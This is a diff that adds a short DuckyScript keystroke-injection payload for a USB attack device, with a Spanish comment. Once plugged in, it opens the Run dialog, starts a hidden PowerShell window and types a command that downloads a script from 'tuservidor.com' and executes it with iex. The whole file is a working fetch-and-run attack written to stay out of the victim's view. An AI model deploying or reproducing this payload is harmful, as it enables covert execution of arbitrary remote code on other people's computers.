@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 700
+
+REM Descargar y ejecutar script desde internet
+STRING iex (New-Object Net.WebClient).DownloadString('https://tuservidor.com/usb-sound.ps1')
+ENTER
